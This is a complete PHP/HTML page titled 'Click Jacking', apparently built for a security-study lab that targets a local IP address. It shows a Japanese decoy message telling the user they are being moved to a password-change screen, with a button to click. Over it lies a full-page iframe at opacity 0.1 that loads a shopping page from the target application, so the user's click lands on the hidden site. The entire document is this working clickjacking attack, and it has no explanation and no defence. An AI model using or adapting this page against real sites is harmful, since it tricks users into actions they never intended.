<?php


?>

<html>
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>Click Jacking</title>
		<!-- BootstrapのCSS読み込み -->
		<link href="css/bootstrap.min.css" rel="stylesheet">
		<!-- 独自CSS読み込み -->
		<link href="css/custom-default.css" rel="stylesheet">
		<!-- jQuery読み込み -->
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
		<!-- BootstrapのJS読み込み -->
		<script src="js/bootstrap.min.js"></script>
	</head>

	<body>

		<div class="shopping-container">

			<div class="container-fluid">
				<div class="row" style="padding:260px 20px 0px;">
					<blockquote class="block-message" style="margin:0px;border-left-color:#337ab7;">
					  <p>パスワード変更画面に遷移しています。そのままおまちください...</p>
					</blockquote>
				</div>
				<div class="row" style="padding:20px 0px 0px 20px;">
					<div class="col-sm-6" style="">
						遷移しない場合は、「移動する」ボタンをクリックしてください。
					</div>
					<div class="col-sm-6" style="padding-left:0px;">
						  <a class="" href="#"></a>
						<button type="submit" style="width:140px;" class="btn btn-primary">移動する</button>
					</div>
				</div>

			</div>

		</div>

		<iframe width="100%" height="100%" style="opacity: 0.1; position:absolute; top:0px; left:0px;"
			src="http://192.168.30.145/SecurityStudy/php/main.php?contentId=shopping_car">
		  <p>Your browser does not support iframes.</p>
		</iframe>
	</body>
</html>


